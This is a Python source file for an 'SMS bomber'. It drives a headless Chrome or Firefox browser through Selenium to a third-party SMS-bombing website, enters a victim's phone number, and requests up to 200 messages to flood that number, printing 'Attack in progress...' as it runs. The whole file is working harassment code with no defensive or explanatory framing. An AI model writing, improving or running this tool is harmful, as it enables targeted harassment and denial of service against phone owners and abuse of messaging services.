from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.firefox.service import Service as FirefoxService
from about import menu, about
import time
import os
import sys

def remsp(num):
    num = num.replace(' ', '')
    num = num.replace('-', '')
    return num

def validate_input(cc, ph):
    if len(cc) >= 4 or len(cc) < 1:
        print('    |-$ Invalid Country Code')
        return False
    
    if len(ph) <= 6:
        print('    |-$ Invalid Phone Number')
        return False
    
    for cch in str(cc + ph):
        if not cch.isdigit():
            print('    |-$ Phone Number Must Be Numeric')
            return False
    
    return True

def smsbombingwin():
    cc = input("    |-$ Enter Your Country Code (Without +) > ")
    ph = input('    |-$ Enter Target Number > ' + " +" + cc + " ")
    
    ph = remsp(ph)
    
    if not validate_input(cc, ph):
        return
    
    try:
        repcount = int(input('    |-$ How many times (1-200) ? > '))
        if repcount < 1 or repcount > 200:
            print('    |-$ Enter a number between 1 and 200')
            return
    except ValueError:
        print('    |-$ Invalid number')
        return
    
    print("    |-$ Setting up Chrome...")
    
    options = ChromeOptions()
    options.add_argument("--headless")
    options.add_argument("--log-level=3")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    
    chromedriver_path = os.path.join(os.getcwd(), 'chromedriver.exe')
    
    if not os.path.exists(chromedriver_path):
        print(f'    |-$ ChromeDriver not found')
        return
    
    service = ChromeService(executable_path=chromedriver_path)
    
    try:
        browser = webdriver.Chrome(service=service, options=options)
    except Exception as e:
        print(f'    |-$ Failed to start Chrome')
        return
    
    print("    |-$ Attack in progress...")
    
    try:
        if cc == '91':
            browser.get('https://mytoolstown.com/smsbomber/#bestsmsbomber')
            WebDriverWait(browser, 20).until(
                EC.presence_of_element_located((By.ID, "mobno"))
            )
        else:
            browser.get('https://mytoolstown.com/smsbomber/change.php')
            WebDriverWait(browser, 20).until(
                EC.presence_of_element_located((By.NAME, "countrycode"))
            )
            
            select = Select(browser.find_element(By.NAME, 'countrycode'))
            try:
                select.select_by_value(cc)
            except:
                print('    |-$ Invalid country code')
                return
            
            browser.find_element(By.NAME, 'submit').click()
            time.sleep(5)
            browser.get('https://mytoolstown.com/smsbomber/#bestsmsbomber')
            WebDriverWait(browser, 20).until(
                EC.presence_of_element_located((By.ID, "mobno"))
            )
        
        browser.find_element(By.ID, 'mobno').send_keys(int(ph))
        time.sleep(2)
        browser.find_element(By.ID, 'count').send_keys(repcount)
        time.sleep(1)
        browser.find_element(By.ID, 'count').send_keys(Keys.TAB + Keys.ARROW_DOWN + Keys.ARROW_DOWN + Keys.ENTER)
        
        timeout = 0
        while browser.current_url != 'https://mytoolstown.com/smsbomber/success.php' and timeout < 60:
            time.sleep(1)
            timeout += 1
        
        if timeout >= 60:
            print('    |-$ Timeout')
        else:
            print('    |-} Done')
            
    except Exception as e:
        print(f'    |-$ Error occurred')
    finally:
        time.sleep(2)
        browser.quit()
    
    print('    |-----------------------------------------------------------')

def smsbombinglinux():
    cc = input("    |-$ Enter Your Country Code (Without +) > ")
    ph = input('    |-$ Enter Target Number > ' + " +" + cc + " ")
    
    ph = remsp(ph)
    
    if not validate_input(cc, ph):
        return
    
    try:
        repcount = int(input('    |-$ How many times (1-200) ? > '))
        if repcount < 1 or repcount > 200:
            print('    |-$ Enter a number between 1 and 200')
            return
    except ValueError:
        print('    |-$ Invalid number')
        return
    
    print("    |-$ Setting up Firefox...")
    
    options = FirefoxOptions()
    options.add_argument("--headless")
    options.add_argument("--log-level=3")
    
    geckodriver_path = os.path.join(os.getcwd(), 'geckodriver')
    
    if not os.path.exists(geckodriver_path):
        print(f'    |-$ GeckoDriver not found')
        return
    
    service = FirefoxService(executable_path=geckodriver_path)
    
    try:
        browser = webdriver.Firefox(service=service, options=options)
    except Exception as e:
        print(f'    |-$ Failed to start Firefox')
        return
    
    print("    |-$ Attack in progress...")
    
    try:
        if cc == '91':
            browser.get('https://mytoolstown.com/smsbomber/#bestsmsbomber')
            WebDriverWait(browser, 20).until(
                EC.presence_of_element_located((By.ID, "mobno"))
            )
        else:
            browser.get('https://mytoolstown.com/smsbomber/change.php')
            WebDriverWait(browser, 20).until(
                EC.presence_of_element_located((By.NAME, "countrycode"))
            )
            
            select = Select(browser.find_element(By.NAME, 'countrycode'))
            try:
                select.select_by_value(cc)
            except:
                print('    |-$ Invalid country code')
                return
            
            browser.find_element(By.NAME, 'submit').click()
            time.sleep(5)
            browser.get('https://mytoolstown.com/smsbomber/#bestsmsbomber')
            WebDriverWait(browser, 20).until(
                EC.presence_of_element_located((By.ID, "mobno"))
            )
        
        browser.find_element(By.ID, 'mobno').send_keys(int(ph))
        time.sleep(2)
        browser.find_element(By.ID, 'count').send_keys(repcount)
        time.sleep(1)
        browser.find_element(By.ID, 'count').send_keys(Keys.TAB + Keys.ARROW_DOWN + Keys.ARROW_DOWN + Keys.ENTER)
        
        timeout = 0
        while browser.current_url != 'https://mytoolstown.com/smsbomber/success.php' and timeout < 60:
            time.sleep(1)
            timeout += 1
        
        if timeout >= 60:
            print('    |-$ Timeout')
        else:
            print('    |-} Done')
            
    except Exception as e:
        print(f'    |-$ Error occurred')
    finally:
        time.sleep(2)
        browser.quit()
    
    print('    |-----------------------------------------------------------')